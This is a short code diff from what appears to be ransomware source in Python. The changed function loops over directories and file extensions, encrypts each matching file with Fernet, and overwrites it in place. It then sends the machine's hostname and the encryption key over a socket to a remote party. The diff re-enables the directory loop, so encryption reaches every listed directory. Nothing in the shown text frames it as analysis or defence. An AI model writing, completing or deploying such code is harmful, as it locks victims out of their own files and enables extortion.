@@ -39,13 +39,13 @@ def loading():
 
 
 def encryption(s: socket):
-    #for dir in dirs:
-    for ext in extensions:
-        for file in glob(dir + ext, recursive=True):
-            with open(file, 'rb') as t:
-                enc = fernet.encrypt(t.read())
-            with open(file, 'wb') as f:
-                f.write(enc)
+    for dir in dirs:
+        for ext in extensions:
+            for file in glob(dir + ext, recursive=True):
+                with open(file, 'rb') as t:
+                    enc = fernet.encrypt(t.read())
+                with open(file, 'wb') as f:
+                    f.write(enc)
                 
     msg = {'Hostname': gethostname(), 'key': KEY.decode()}
     send_msg_dict(s, msg)
